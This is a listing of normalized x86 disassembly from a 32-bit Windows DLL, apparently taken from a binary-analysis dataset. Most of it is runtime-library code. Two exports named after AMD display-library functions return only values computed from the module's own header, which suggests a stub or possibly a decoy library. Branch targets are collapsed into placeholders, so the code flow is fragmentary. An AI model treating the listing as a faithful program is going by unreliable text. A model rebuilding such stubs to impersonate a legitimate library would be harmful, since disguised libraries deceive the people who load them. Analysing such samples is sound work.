push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
push esi
push esi
call sub_1007fa90
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_10057f0f
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
mov edi [ ebp - 0x1c ]
call sub_1004b783
mov [ eax ] edi
mov edi [ ebp - 0x24 ]
call sub_1005e66c
mov [ eax ] edi
mov edi [ ebp - 0x28 ]
call sub_1001defb
mov [ eax ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10084b49
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push eax
call sub_10035d06
pop ecx
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_1002c5fc
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_10069c0f
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_1004b783
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_1005e66c
mov [ eax ] esi
jmp r-xdata
inc esi
inc esi
push esi
call sub_1002c5fc
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_10084be0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_10049c9d
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_10084c32
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_10067d3a
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push 0x9
call sub_1003ca39
and [ esi ] 0x0
mov eax [ ebp - 0x4 ]
pop esi
sub edi esi
push eax
call sub_100041c3
mov [ esi ] eax
add esi 0x4
mov eax [ edi + esi ]
pop ecx
test eax eax
jne r-xdata
sub_1008a6d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a68c
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
push esi
push r--data
mov ecx rw-data
call sub_1005ddc0
mov [ ebp - 0x4 ] esi
push esi
xor eax eax
mov edi 0x7
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] ax
call sub_1005ddc0
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
push esi
mov [ rw-data ] cx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
call sub_1005ddc0
mov [ ebp - 0x4 ] 0x2
push esi
xor edx edx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] dx
call sub_1005ddc0
mov [ ebp - 0x4 ] 0x3
push esi
xor eax eax
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] ax
call sub_1005ddc0
mov [ ebp - 0x4 ] 0x4
xor ecx ecx
push esi
mov [ rw-data ] cx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
call sub_1005ddc0
mov [ ebp - 0x4 ] 0x5
push esi
xor edx edx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] dx
call sub_1005ddc0
push 0x206
xor eax eax
push esi
push rw-data
mov [ rw-data ] ax
call sub_1007f940
push 0x3cf0
push esi
push rw-data
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_1007f940
push 0x3cf0
push esi
push rw-data
call sub_1007f940
push 0x3c
push esi
push rw-data
call sub_1007f940
push 0x78
push esi
push rw-data
call sub_1007f940
push 0x78
push esi
push rw-data
call sub_1007f940
add esp 0x48
push 0x3cf0
push esi
push rw-data
call sub_1007f940
push 0x3cf0
push esi
push rw-data
call sub_1007f940
xor eax eax
push 0x208
push esi
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] ax
call sub_1007f940
push 0x208
push esi
push rw-data
call sub_1007f940
push 0x208
push esi
push rw-data
call sub_1007f940
push 0x208
push esi
push rw-data
call sub_1007f940
add esp 0x48
push 0x208
xor eax eax
push esi
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_1007f940
push 0x208
push esi
push rw-data
call sub_1007f940
push 0x208
push esi
push rw-data
call sub_1007f940
push 0x208
push esi
push rw-data
call sub_1007f940
push 0x1450
push esi
push rw-data
call sub_1007f940
push 0x1450
push esi
push rw-data
call sub_1007f940
add esp 0x48
push 0x1450
push esi
push rw-data
call sub_1007f940
push 0x1450
push esi
push rw-data
call sub_1007f940
push 0x208
push esi
push rw-data
mov [ rw-data ] esi
call sub_1007f940
push 0x208
push esi
push rw-data
call sub_1007f940
push 0x208
push esi
push rw-data
call sub_1007f940
push 0x208
xor eax eax
push esi
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_1007f940
add esp 0x48
push j_sub_1000a7a0
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_100592b3
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1008aa90
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1001f84c
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10069ac6
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10024fe9
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_1008aef0
mov [ edx + 0x15 ] al
call sub_100592b3
add esp 0x4
mov esp ebp
pop ebp
retn
sub_1008ab10
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1001f84c
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10069ac6
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10024fe9
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_1008add0
mov [ edx + 0x15 ] al
call sub_100592b3
add esp 0x4
mov esp ebp
pop ebp
retn
sub_1008ab90
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1001f84c
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10069ac6
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10024fe9
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_1008ae30
mov [ edx + 0x15 ] al
call sub_100592b3
add esp 0x4
mov esp ebp
pop ebp
retn
sub_1008ac10
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1001f84c
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10069ac6
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10024fe9
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_1008ae90
mov [ edx + 0x15 ] al
call sub_100592b3
add esp 0x4
mov esp ebp
pop ebp
retn
sub_1008add0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084e9a
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_100242b0
mov ecx [ rw-data ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_1008ae30
push ebp
mov ebp esp
push 0xffffffff
push sub_10084eca
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_100242b0
mov ecx [ rw-data ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_1008ae90
push ebp
mov ebp esp
push 0xffffffff
push sub_10084efa
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_100242b0
mov ecx [ rw-data ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_1008aef0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084f2a
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_100242b0
mov ecx [ rw-data ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_1008af50
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
push ecx
push rw-data
push edx
push eax
call sub_10028f80
mov eax [ rw-data ]
push eax
call sub_100187af
add esp 0x14
sub_10001aac
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10041c99
add esp 0x10
pop ebp
retn
sub_10001d33
push [ ecx ]
call sub_1000830a
pop ecx
retn
sub_10002a2a
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_10003120
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001000
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10003b80
mov ecx [ ebp - 0x14 ]
call sub_10061dab
push 0x0
push 0x0
call sub_10024fe9
int3
sub_10003f1e
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_1005ba3e
add esp 0xc
pop ebp
retn
sub_10003f34
mov eax [ ecx + 0x4 ]
retn
sub_10003f80
or eax 0xffffffff
retn 0x4
sub_100044a4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push 0x3
mov [ eax ] ecx
pop eax
pop ebp
retn 0x10
sub_10005aec
push [ ebp + 0x8 ]
call sub_1005b23c
pop ecx
retn
sub_10006730
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
jmp edx
xor eax eax
retn
sub_10006e10
push ecx
call [ VariantClear@IAT ]
retn
sub_10006f70
mov eax [ ecx - 0x10 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x10 ] r--data
retn
sub_100077a0
mov eax 0x5
retn
sub_10007b3a
push 0xc
call sub_1001821c
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_1000830a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_10008980
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x1c ]
push edi
mov edi [ ebp + 0x14 ]
push eax
call sub_1005e400
pop edi
pop ebp
retn
sub_10008a22
call sub_10044649
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10007acd
sub_10008a50
mov eax 0x80004001
retn 0xc
sub_10008b10
push ebp
mov ebp esp
pop ebp
jmp sub_100187af
sub_100090b2
cmp [ ebp + 0x10 ] edi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_100281cd
sub_100091c0
mov eax 0x80004001
retn 0x14
sub_1000aa80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
add ecx 0x8
push ecx
push 0x5
push eax
call sub_1000e7d0
add esp 0xc
pop ebp
retn
sub_1000bde0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
jmp eax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ eax ]
movzx eax [ eax ]
retn
sub_1000e858
push 0x5
pop eax
retn
sub_1000e860
mov eax ecx
cmp [ eax + 0x14 ] 0x10
jb r-xdata
retn
mov eax [ eax ]
sub_1000ee50
mov eax [ ecx + 0x4 ]
push eax
call sub_100187af
pop ecx
retn
sub_1000f3af
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001415d
add esp 0x14
pop ebp
retn
sub_1000ff3d
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000ff56
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1001f7a0
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100100de
xor eax eax
inc eax
retn
sub_100100e2
mov esp [ ebp - 0x18 ]
call sub_1004cfe6
sub_1001015e
push esi
call sub_10001ba4
pop ecx
retn
sub_100102df
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_100109c5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_100109d4
push 0x0
call sub_100011f1
pop ecx
retn
sub_10010b30
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x0
pop ebp
retn 0x4
sub_100121ef
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001238a
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10032b35
add esp 0xc
pop ebp
retn
sub_1001255a
push 0xd
call sub_1001821c
pop ecx
retn
sub_100128de
mov edx [ ebp - 0x14 ]
push edx
call sub_100187af
add esp 0x4
push 0x0
push 0x0
call sub_10024fe9
int3
sub_10012bb9
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
leave
retn
ADL2_Overdrive6_StateInfo_Get
push 0x0
call [ GetModuleHandleW@IAT ]
movzx eax [ eax ]
cdq
mov ecx 0x4d
idiv ecx
lea eax [ edx + 0x1 ]
retn
sub_10012e51
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_10035d06
pop ecx
sub_10012f18
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10007b46
pop ecx
pop ecx
pop ebp
retn
sub_1001313b
push ebx
call sub_1005b23c
pop ecx
retn
sub_10013ab8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_10013bca
push 0xa
call sub_1001821c
pop ecx
retn
ADL2_Adapter_ModeSwitch
push 0x0
call [ GetModuleHandleW@IAT ]
mov ecx [ eax + 0x3c ]
movzx eax [ ecx + eax + 0x2 ]
lea eax [ eax + eax * 2 + 0x3 ]
retn
sub_100141d4
xor eax eax
retn 0x14
sub_100144c5
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_1001821c
pop ecx
j_sub_10071ca2
jmp sub_10071ca2
sub_10014620
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x4
j_sub_10071ca2#2
jmp sub_10071ca2
sub_10016616
push 0xd
call sub_1001821c
pop ecx
retn
sub_10016622
push 0xc
call sub_1001821c
pop ecx
retn
sub_1001662b
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100627b5
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_10016e69
call sub_10044649
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_1004cfe6
call eax
sub_1001706d
mov eax [ rw-data ]
retn
sub_10017630
mov eax 0x6
retn
sub_10017b10
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x34 ]
mov eax [ ecx ]
cdq
retn
sub_10017b30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_10013acc
add esp 0x8
pop ebp
retn 0x4
sub_10017c60
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn 0x14
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_10017e52
mov eax rw-data
retn
sub_10018202
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1008049b
add esp 0x10
pop ebp
retn
sub_1001821c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10018700
add ecx 0x4
jmp sub_1002cbca
sub_100187c0
push ebp
mov ebp esp
pop ebp
jmp sub_1001f84c
sub_10018d27
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_100190d3
call sub_10044649
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10007acd
sub_10019170
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_10014506
add esp 0x8
pop ebp
retn 0x4
sub_1001ba31
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1001f7a0
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001bec0
mov eax [ eax ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
jmp eax
sub_1001c5c3
mov eax [ ebp - 0x14 ]
push eax
call sub_100187af
add esp 0x4
push 0x0
push 0x0
call sub_10024fe9
int3
sub_1001c957
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_10021455
push [ esi ]
call sub_100187af
pop ecx
pop ecx
pop esi
retn
sub_1001ca46
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
cmp [ ebp + 0x14 ] eax
jae r-xdata
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
sub_1001ca60
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx esi
call sub_1002cb30
push esi
call sub_100187af
add esp 0x4
sub_1001d035
mov ecx [ ebp - 0x14 ]
call sub_10061dab
push 0x0
push 0x0
call sub_10024fe9
int3
sub_1001d9e3
mov edi edi
push ebp
mov ebp esp
call sub_10044649
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_1001d9f5
mov ecx [ ecx + 0x4 ]
call sub_1000ff00
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1001daa0
mov eax [ eax ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_1001defb
mov eax rw-data
retn
sub_1001df52
push 0x6
call sub_1001821c
pop ecx
retn
sub_1001e658
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ebp
retn 0x8
sub_1001e680
mov eax 0x80004002
retn 0xc
sub_1001f0a0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push eax
push ecx
mov ecx [ ebp + 0x18 ]
call sub_1005a9d0
pop ebp
retn
sub_1001f460
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x30 ]
mov eax [ ecx ]
cdq
retn
sub_10020210
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push 0xa
push edx
call sub_1000f3af
add esp 0x10
pop ebp
retn
sub_100202bc
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_10020591
xor eax eax
retn
sub_10021455
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_10021d40
push esi
xor esi esi
mov eax 0xcccccccd
mul ecx
shr edx 0x3
mov ecx edx
inc esi
test ecx ecx
jne r-xdata
mov eax esi
pop esi
retn
sub_1002200e
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10037a1d
add esp 0x10
pop ebp
retn 0xc
sub_100220fe
push 0xa
call sub_1001821c
pop ecx
retn
sub_100221bc
push 0xb
call sub_1001821c
pop ecx
retn
sub_10022733
mov eax [ ebp - 0x14 ]
push eax
call sub_100187af
add esp 0x4
push 0x0
push 0x0
call sub_10024fe9
int3
j_sub_1005b90d
jmp sub_1005b90d
sub_10022c52
jmp r-xdata
cmp [ rw-data ] 0xa
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax * 4 + rw-data ]
inc [ rw-data ]
push eax
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
retn
call eax
sub_10023102
push 0x1
call sub_1001821c
pop ecx
retn
sub_1002310b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10061e1c
pop ecx
pop ecx
pop ebp
retn
sub_100231c5
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_10024fe9
int3
call sub_1005e560
sub_100234fd
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001000
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10023960
mov ax [ ecx + 0xc ]
retn
sub_10024350
push ecx
mov [ ecx ] r--data
call sub_1005fbb8
pop ecx
retn
sub_10024441
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10007908
sub_1002444c
push 0x0
call sub_1006b226
pop ecx
retn
sub_100247f0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push 0x100
push edx
call sub_1000f3af
add esp 0x10
pop ebp
retn
sub_10025100
push sub_1004cfe6
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_10026103
mov [ ecx ] r--data
retn
sub_100279dc
mov edi edi
push ebp
mov ebp esp
call sub_1003f6c7
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
int3
push eax
call sub_1003fa7a
pop ecx
sub_10027a63
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_10028774
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_1007f14d
add esp 0xc
pop ebp
retn
sub_10028b87
mov eax 0x1
retn
sub_10028c40
xor eax eax
retn 0x4
sub_10029263
xor al al
retn
sub_1002ad20
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_1002b653
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_10013acc
pop ecx
pop ecx
pop ebp
retn 0x4
sub_1002bec0
push 0xd
call sub_1001821c
pop ecx
retn
sub_1002bec9
push 0xc
call sub_1001821c
pop ecx
retn
sub_1002c7c8
mov esi [ ebp + 0x8 ]
call sub_1006a530
push 0x0
push 0x0
call sub_10024fe9
int3
sub_1002cbca
push [ ecx ]
call sub_100102df
pop ecx
retn
sub_1002cbd3
mov eax [ ecx + 0x1c ]
retn
sub_1002cbe0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebp
retn
call [ GetLastError@IAT ]
sub_1002d8ee
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
leave
retn
sub_1002e27e
mov ecx [ ebp - 0x14 ]
push ecx
call sub_100187af
add esp 0x4
push 0x0
push 0x0
